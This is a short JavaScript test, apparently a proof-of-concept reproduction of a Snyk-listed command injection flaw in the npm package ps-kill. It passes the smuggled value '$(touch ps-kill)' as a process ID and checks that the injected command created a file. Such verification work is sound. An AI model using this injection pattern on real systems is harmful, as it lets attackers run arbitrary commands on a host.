//https://snyk.io/vuln/SNYK-JS-PSKILL-1078529
test("Command Injection in ps-kill", () => {
  const ps_kill = require("ps-kill");
  const fs = require("fs");
  const path = "./ps-kill";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps_kill.kill("$(touch ps-kill)", function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
